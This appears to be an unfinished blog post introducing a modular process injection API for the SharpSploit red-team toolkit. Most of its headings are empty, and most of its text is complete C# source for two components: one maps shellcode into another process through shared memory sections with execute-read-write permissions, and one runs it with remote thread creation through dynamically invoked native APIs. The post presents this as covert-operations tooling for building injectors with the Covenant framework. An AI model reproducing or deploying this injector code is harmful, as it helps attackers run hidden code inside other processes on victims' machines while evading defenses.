--
layout: post
title: Enabling Covert Operations - 2: Modular Process Injection API
---

*TLDR: A new modular process injection API for SharpSploit that allows tool developers to easily build injectors by combining allocation and execution components. Simple to use, configurable, and easily extensible.*

# Process Injection

## Word Soup

## Primitives

### Allocation

### Write

### Execution

## Modular Components

Write primitives are wrapped by an allocation component and only exposed as an option if it is relevant. In some allocation components, the write primitive matters. In others, it does not.

* *Allocation*: An allocation component makes a payload available to the target process.
* *Execution*: An Execution component executes a payload within a target process.

### Writing New Components

# Allocation Example - Section Mapping

```csharp

/// <summary>
/// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
/// </summary>
public class SectionMapAlloc : AllocationTechnique
{
    // Publically accessible options

    public uint localSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
    public uint remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
    public uint sectionAttributes = Win32.WinNT.SEC_COMMIT;

    /// <summary>
    /// Default constructor.
    /// </summary>
    public SectionMapAlloc()
    {
        DefineSupportedPayloadTypes();
    }

    /// <summary>
    /// Constructor allowing options as arguments.
    /// </summary>
    public SectionMapAlloc(uint localPerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint remotePerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint atts = Win32.WinNT.SEC_COMMIT)
    {
        DefineSupportedPayloadTypes();
        localSectionPermissions = localPerms;
        remoteSectionPermissions = remotePerms;
        sectionAttributes = atts;
    }

    /// <summary>
    /// States whether the payload is supported.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">Payload that will be allocated.</param>
    /// <returns></returns>
    public override bool IsSupportedPayloadType(PayloadType Payload)
    {
        return supportedPayloads.Contains(Payload.GetType());
    }

    /// <summary>
    /// Internal method for setting the supported payload types. Used in constructors.
    /// Update when new types of payloads are added.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    internal override void DefineSupportedPayloadTypes()
    {
        //Defines the set of supported payload types.
        supportedPayloads = new Type[] {
            typeof(PICPayload)
        };
    }

    /// <summary>
    /// Allocate the payload to the target process. Handles unknown payload types.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">The payload to allocate to the target process.</param>
    /// <param name="Process">The target process.</param>
    /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
    public override IntPtr Allocate(PayloadType Payload, Process Process)
    {
        if (!IsSupportedPayloadType(Payload))
        {
            throw new PayloadTypeNotSupported(Payload.GetType());
        }
        return Allocate(Payload, Process, IntPtr.Zero);
    }

    /// <summary>
    /// Allocate the payload in the target process.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">The PIC payload to allocate to the target process.</param>
    /// <param name="Process">The target process.</param>
    /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
    /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
    public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
    {
        // Get a convenient handle for the target process.
        IntPtr procHandle = Process.Handle;

        // Create a section to hold our payload
        IntPtr sectionAddress = CreateSection((uint)Payload.Payload.Length, sectionAttributes);

        // Map a view of the section into our current process with RW permissions
        SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress,
            localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(Payload.Payload.Length));

        // Copy the shellcode to the local view
        System.Runtime.InteropServices.Marshal.Copy(Payload.Payload, 0, details.baseAddr, Payload.Payload.Length);

        // Now that we are done with the mapped view in our own process, unmap it
        Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);

        // Now, map a view of the section to other process. It should already hold the payload.

        SectionDetails newDetails;

        if (PreferredAddress != IntPtr.Zero)
        {
            // Attempt to allocate at a preferred address. May not end up exactly at the specified location.
            // Refer to MSDN documentation on ZwMapViewOfSection for details.
            newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, PreferredAddress, (ulong)Payload.Payload.Length);
        }
        else
        {
            newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, IntPtr.Zero, (ulong)Payload.Payload.Length);
        }
        return newDetails.baseAddr;
    }

    /// <summary>
    /// Creates a new Section.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="size">Max size of the Section.</param>
    /// <param name="allocationAttributes">Section attributes (eg. Win32.WinNT.SEC_COMMIT).</param>
    /// <returns></returns>
    private static IntPtr CreateSection(ulong size, uint allocationAttributes)
    {
        // Create a pointer for the section handle
        IntPtr SectionHandle = new IntPtr();
        ulong maxSize = size;

        Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(
            ref SectionHandle,
            0x10000000,
            IntPtr.Zero,
            ref maxSize,
            Win32.WinNT.PAGE_EXECUTE_READWRITE,
            allocationAttributes,
            IntPtr.Zero
        );
        // Perform error checking on the result
        if (result < 0)
        {
            return IntPtr.Zero;
        }
        return SectionHandle;
    }

    /// <summary>
    /// Maps a view of a section to the target process.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
    /// <param name="sectionHandle">Handle to the section.</param>
    /// <param name="protection">What permissions to use on the view.</param>
    /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
    /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
    /// <returns>A struct containing address and size of the mapped view.</returns>
    public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
    {
        // Copied so that they may be passed by reference but the original value preserved
        IntPtr baseAddr = addr;
        ulong size = sizeData;

        uint disp = 2;
        uint alloc = 0;

        // Returns an NTSTATUS value
        Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(
            sectionHandle, procHandle,
            ref baseAddr,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
            ref size, disp, alloc,
            protection
        );

        // Create a struct to hold the results.
        SectionDetails details = new SectionDetails(baseAddr, sizeData);

        return details;
    }


    /// <summary>
    /// Holds the data returned from NtMapViewOfSection.
    /// </summary>
    public struct SectionDetails
    {
        public IntPtr baseAddr;
        public ulong size;

        public SectionDetails(IntPtr addr, ulong sizeData)
        {
            baseAddr = addr;
            size = sizeData;
        }
    }

    /// <summary>
    /// Unmaps a view of a section from a process.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="hProc">Process to which the view has been mapped.</param>
    /// <param name="baseAddr">Address of the view (relative to the target process)</param>
    /// <returns></returns>
    public static Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
    {
        return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
    }
}

```

# Execution Example - Remote Thread Creation

```csharp

/// <summary>
/// Executes a payload in a remote process by creating a new thread. Allows the user to specify which API call to use for remote thread creation.
/// </summary>
public class RemoteThreadCreate : ExecutionTechnique
{
    // Publically accessible options
    public bool suspended = false;
    public APIS api = APIS.NtCreateThreadEx;

    public enum APIS : int
    {
        NtCreateThreadEx = 0,
        // NtCreateThread = 1, // Not implemented
        RtlCreateUserThread = 2,
        CreateRemoteThread = 3
    };

    // Handle of the new thread. Only valid after the thread has been created.
    public IntPtr handle = IntPtr.Zero;

    /// <summary>
    /// Default constructor.
    /// </summary>
    public RemoteThreadCreate()
    {
        DefineSupportedPayloadTypes();
    }

    /// <summary>
    /// Constructor allowing options as arguments.
    /// </summary>
    public RemoteThreadCreate(bool susp = false, APIS varAPI = APIS.NtCreateThreadEx)
    {
        DefineSupportedPayloadTypes();
        suspended = susp;
        api = varAPI;
    }

    /// <summary>
    /// States whether the payload is supported.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">Payload that will be allocated.</param>
    /// <returns></returns>
    public override bool IsSupportedPayloadType(PayloadType Payload)
    {
        return supportedPayloads.Contains(Payload.GetType());
    }

    /// <summary>
    /// Internal method for setting the supported payload types. Used in constructors.
    /// Update when new types of payloads are added.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    internal override void DefineSupportedPayloadTypes()
    {
        // Defines the set of supported payload types.
        supportedPayloads = new Type[] {
            typeof(PICPayload)
        };
    }

    /// <summary>
    /// Only ever called if the user passed in a Payload type without an Inject overload.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">Payload type.</param>
    /// <param name="AllocationTechnique">Allocation technique.</param>
    /// <param name="Process">The target process.</param>
    /// <returns></returns>
    public bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique, Process Process)
    {
        if (!IsSupportedPayloadType(Payload))
        {
            throw new PayloadTypeNotSupported(Payload.GetType());
        }
        return Inject(Payload, AllocationTechnique, Process);
    }

    public bool Inject(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
    {
        IntPtr baseAddr = AllocationTechnique.Allocate(Payload, Process);
        return Inject(Payload, baseAddr, Process);
    }

    /// <summary>
    /// Create a thread in the remote process.
    /// </summary>
    /// <author>The Wover (@TheRealWover)</author>
    /// <param name="Payload">The shellcode payload to execute in the target process.</param>
    /// <param name="BaseAddress">The address of the shellcode in the target process.</param>
    /// <param name="Process">The target process to inject into.</param>
    /// <returns></returns>
    public bool Inject(PICPayload Payload, IntPtr BaseAddress, Process Process)
    {
        IntPtr threadHandle = new IntPtr();
        Native.NTSTATUS result = Native.NTSTATUS.Unsuccessful;

        if (api == APIS.NtCreateThreadEx)
        {
            // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
            result = DynamicInvoke.Native.NtCreateThreadEx(
                ref threadHandle,
                Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                IntPtr.Zero,
                Process.Handle, BaseAddress, IntPtr.Zero,
                suspended, 0, 0, 0, IntPtr.Zero
            );
        }
        else if (api == APIS.RtlCreateUserThread)
        {
            // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
            result = DynamicInvoke.Native.RtlCreateUserThread(
                Process.Handle,
                IntPtr.Zero,
                suspended,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                BaseAddress,
                IntPtr.Zero, ref threadHandle, IntPtr.Zero
            );
        }
        else if (api == APIS.CreateRemoteThread)
        {
            uint flags = suspended ? (uint)0x00000004 : 0;
            IntPtr threadid = new IntPtr();

            // Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
            threadHandle = DynamicInvoke.Win32.CreateRemoteThread(
                Process.Handle,
                IntPtr.Zero,
                0,
                BaseAddress,
                IntPtr.Zero,
                flags,
                ref threadid
            );

            if (threadHandle == IntPtr.Zero)
            {
                return false;
            }
            handle = threadHandle;
            return true;
        }

        // If successful, return the handle to the new thread. Otherwise return NULL
        if (result == Native.NTSTATUS.Unsuccessful || result <= Native.NTSTATUS.Success)
        {
            return false;
        }
        handle = threadHandle;
        return true;            
    }
}

```

### Demo - Covenant

Use Covenant's SharpShell to build a custom injector on the fly.

Record video.